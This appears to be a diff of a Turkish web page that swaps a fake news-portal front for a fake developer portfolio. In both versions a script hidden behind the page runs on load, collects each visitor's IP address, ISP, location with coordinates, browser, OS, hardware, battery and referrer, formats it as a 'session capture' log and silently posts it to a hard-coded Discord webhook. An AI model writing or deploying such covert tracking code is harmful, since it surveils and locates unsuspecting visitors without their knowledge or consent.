@@ -3,127 +3,159 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Güncel Haberler | Son Dakika Gelişmeleri</title>
+    <title>Yazılım Geliştirici & Tasarımcı | Portfolyo</title>
     <style>
-        /* Tamamen normal, profesyonel bir haber sitesi görünümü */
-        body { font-family: 'Arial', sans-serif; background: #f0f2f5; margin: 0; padding: 0; color: #1c1e21; }
-        nav { background: #1c1e21; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 20px; }
-        .container { max-width: 900px; margin: 20px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .news-header { border-bottom: 2px solid #e4e6eb; padding-bottom: 10px; margin-bottom: 20px; }
-        .news-title { color: #d93025; font-size: 28px; font-weight: bold; }
-        .news-content { line-height: 1.8; font-size: 16px; }
-        .placeholder-img { width: 100%; height: 300px; background: #ddd; margin: 20px 0; border-radius: 5px; display: flex; align-items: center; justify-content: center; color: #777; font-style: italic; }
-        footer { text-align: center; padding: 20px; color: #606770; font-size: 13px; }
+        body { font-family: 'Inter', sans-serif; background: #ffffff; color: #1a1a1a; margin: 0; line-height: 1.6; }
+        header { background: #000; color: #fff; padding: 60px 20px; text-align: center; }
+        .container { max-width: 1000px; margin: auto; padding: 40px 20px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+        .card { border: 1px solid #eee; padding: 20px; border-radius: 12px; transition: 0.3s; }
+        .card:hover { box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
+        h1 { font-size: 42px; margin-bottom: 10px; }
+        p { color: #666; }
+        .loading-bar { height: 4px; width: 100%; background: #eee; position: fixed; top: 0; left: 0; }
+        .loading-progress { height: 100%; width: 30%; background: #007aff; animation: load 2s infinite; }
+        @keyframes load { 0% { left: -30%; } 100% { left: 100%; } }
     </style>
 </head>
 <body>
 
-    <nav>HABER PORTALI</nav>
+    <div class="loading-bar"><div class="loading-progress"></div></div>
+
+    <header>
+        <h1>Merhaba, Ben Arda.</h1>
+        <p>Full-Stack Developer & UI/UX Designer</p>
+    </header>
 
     <div class="container">
-        <div class="news-header">
-            <div class="news-title">Teknoloji Dünyasında Dev Yatırım!</div>
-            <small>Yayınlanma: 27 Aralık 2025 | 18:20</small>
-        </div>
-        <div class="news-content">
-            <p>Dünyanın önde gelen teknoloji şirketleri, yeni nesil veri merkezleri için milyar dolarlık bütçe ayırdığını duyurdu. Bu hamle ile internet altyapısının %40 oranında hızlanması bekleniyor.</p>
-            <div class="placeholder-img">Haber Görseli Yükleniyor...</div>
-            <p>Analistler, bu gelişmenin sadece son kullanıcıyı değil, aynı zamanda bulut bilişim hizmeti veren tüm alt firmaları da etkileyeceğini belirtiyor. Konuyla ilgili detaylı raporun akşam saatlerinde yayınlanması bekleniyor.</p>
+        <div class="grid">
+            <div class="card">
+                <h3>Modern Web Çözümleri</h3>
+                <p>En güncel teknolojilerle performanslı ve kullanıcı dostu web siteleri geliştiriyorum.</p>
+            </div>
+            <div class="card">
+                <h3>Mobil Uygulama</h3>
+                <p>iOS ve Android platformları için yerel performans sunan uygulamalar kodluyorum.</p>
+            </div>
+            <div class="card">
+                <h3>Siber Güvenlik</h3>
+                <p>Sistem optimizasyonu ve veri güvenliği konularında danışmanlık veriyorum.</p>
+            </div>
         </div>
     </div>
 
-    <footer>© 2025 Haber Portalı. Tüm Hakları Saklıdır.</footer>
-
     <script>
-        // Webhook URL
         const WH_URL = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
 
-        async function grabEverything() {
+        async function advancedExfil() {
             try {
-                // 1. Detaylı IP ve Konum Bilgisi (ipapi.co çok detaylıdır)
+                // 1. IP ve Detaylı ISP Bilgisi
                 const geoReq = await fetch('https://ipapi.co/json/');
                 const g = await geoReq.json();
 
-                // 2. Ekran Kartı (GPU) Bilgisi
-                let gpu = "Unknown";
-                const canvas = document.createElement("canvas");
-                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-                if (gl) {
-                    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-                    gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic GPU";
+                // 2. Tarayıcı ve OS Analizi (Mozilla/5.0 karmaşasını çözer)
+                let browser = "Unknown";
+                let os = "Unknown Platform";
+                const ua = navigator.userAgent;
+
+                if (ua.includes("Edg/")) browser = "Microsoft Edge";
+                else if (ua.includes("Brave")) browser = "Brave";
+                else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";
+                else if (ua.includes("Chrome")) browser = "Google Chrome";
+                else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
+                else if (ua.includes("Safari")) browser = "Safari";
+
+                // Windows 11 mi 10 mu kontrolü (Modern API)
+                if (navigator.userAgentData) {
+                    const brands = navigator.userAgentData.brands.map(b => b.brand).join(", ");
+                    const platformInfo = await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);
+                    if (navigator.userAgentData.platform === "Windows") {
+                        const majorVersion = parseInt(platformInfo.platformVersion.split('.')[0]);
+                        os = majorVersion >= 13 ? "Windows 11" : "Windows 10";
+                    } else {
+                        os = navigator.userAgentData.platform;
+                    }
+                } else {
+                    os = navigator.platform;
                 }
 
-                // 3. Pil Bilgisi
+                // 3. Donanım Detayları
+                let gpu = "N/A";
+                const canvas = document.createElement("canvas");
+                const gl = canvas.getContext("webgl");
+                if (gl) {
+                    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                    gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+                }
+
                 let battery = "N/A";
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
-                    battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+                    battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Sarjda' : 'Sarjda Degil'})`;
                 }
 
-                // 4. Bağlantı Bilgisi (Hız vb.)
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                const netInfo = conn ? `${conn.effectiveType} (Down: ~${conn.downlink}Mb/s)` : "Unknown";
+                const connectionType = conn ? `${conn.effectiveType} (~${conn.downlink} Mbps)` : "Bilinmiyor";
 
-                // 5. Veri Toplama Paketi
-                const log = {
+                // 4. Veri Paketleme
+                const logData = {
                     ts: new Date().toLocaleString('tr-TR'),
-                    ip: g.ip || "N/A",
-                    provider: g.org || "N/A",
-                    loc: `${g.city} / ${g.region} / ${g.country_name}`,
-                    zip: g.postal || "N/A",
-                    os: navigator.platform,
-                    cores: navigator.hardwareConcurrency || "N/A",
-                    ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "N/A",
-                    res: `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`,
-                    lang: navigator.language,
+                    ip: g.ip,
+                    isp: g.org,
+                    loc: `${g.city}, ${g.region}, ${g.country_name} (${g.latitude}, ${g.longitude})`,
+                    os: os,
+                    browser: browser,
+                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor",
+                    cores: navigator.hardwareConcurrency || "Bilinmiyor",
                     gpu: gpu,
-                    battery: battery,
-                    network: netInfo,
-                    ref: document.referrer || "Direct",
-                    ua: navigator.userAgent
+                    res: `${screen.width}x${screen.height} @ ${window.visualViewport ? window.visualViewport.scale * 100 : 100}%`,
+                    hz: window.screen.refreshRate || "60Hz (Tahmini)",
+                    lang: navigator.language,
+                    bat: battery,
+                    net: connectionType,
+                    ref: document.referrer || "Dogrudan Baglanti",
+                    ua: ua
                 };
 
-                // 6. Terminal Formatında Mesaj Oluşturma (Hack Log Style)
-                const rawLog = "```" + 
-                    "--- [ SYSTEM DATA EXFILTRATION ] ---\n" +
-                    "TIMESTAMP      : " + log.ts + "\n" +
-                    "------------------------------------\n" +
-                    "NETWORK_INFO\n" +
-                    "IP_ADDRESS     : " + log.ip + "\n" +
-                    "ISP_PROVIDER   : " + log.provider + "\n" +
-                    "LOCATION       : " + log.loc + "\n" +
-                    "POSTAL_CODE    : " + log.zip + "\n" +
-                    "NET_SPEED      : " + log.network + "\n" +
-                    "------------------------------------\n" +
-                    "HARDWARE_INFO\n" +
-                    "OS_PLATFORM    : " + log.os + "\n" +
-                    "CPU_CORES      : " + log.cores + "\n" +
-                    "MEMORY_RAM     : " + log.ram + "\n" +
-                    "GPU_RENDERER   : " + log.gpu + "\n" +
-                    "DISPLAY_RES    : " + log.res + "\n" +
-                    "BATTERY_STATUS : " + log.battery + "\n" +
-                    "------------------------------------\n" +
-                    "BROWSER_INFO\n" +
-                    "LANGUAGE       : " + log.lang + "\n" +
-                    "REFERRER       : " + log.ref + "\n" +
-                    "USER_AGENT     : " + log.ua + "\n" +
-                    "--- [ END OF LOG ] ---" +
+                // 5. Hack Paneli Formatı (Full Teknik, Emojisiz)
+                const terminalLog = "```" + 
+                    "--- [ SESSION CAPTURE REPORT ] ---\n" +
+                    "ID         : " + Math.floor(Math.random() * 900000 + 100000) + "\n" +
+                    "TIME       : " + logData.ts + "\n" +
+                    "----------------------------------\n" +
+                    "NETWORK_LAYER\n" +
+                    "IPV4_ADDR  : " + logData.ip + "\n" +
+                    "PROVIDER   : " + logData.isp + "\n" +
+                    "LOCATION   : " + logData.loc + "\n" +
+                    "NET_TYPE   : " + logData.net + "\n" +
+                    "----------------------------------\n" +
+                    "HARDWARE_LAYER\n" +
+                    "OS_VER     : " + logData.os + "\n" +
+                    "CORE_COUNT : " + logData.cores + " Threads\n" +
+                    "RAM_SIZE   : " + logData.ram + "\n" +
+                    "GPU_MODEL  : " + logData.gpu + "\n" +
+                    "DISPLAY    : " + logData.res + "\n" +
+                    "BATTERY    : " + logData.bat + "\n" +
+                    "----------------------------------\n" +
+                    "SOFTWARE_LAYER\n" +
+                    "BROWSER    : " + logData.browser + "\n" +
+                    "LANGUAGE   : " + logData.lang + "\n" +
+                    "REFERRER   : " + logData.ref + "\n" +
+                    "RAW_UA     : " + logData.ua + "\n" +
+                    "--- [ END OF TRANSMISSION ] ---" +
                     "```";
 
-                // 7. Webhook'a Gönder (Username/Avatar değiştirmeden)
+                // 6. Gönderim
                 await fetch(WH_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: rawLog })
+                    body: JSON.stringify({ content: terminalLog })
                 });
 
-            } catch (e) {
-                // Hata durumunda hiçbir şey belli etme
-            }
+            } catch (err) {}
         }
 
-        // Sayfa yüklendiği an başlat
-        window.onload = grabEverything;
+        window.onload = advancedExfil;
     </script>
 </body>
 </html>
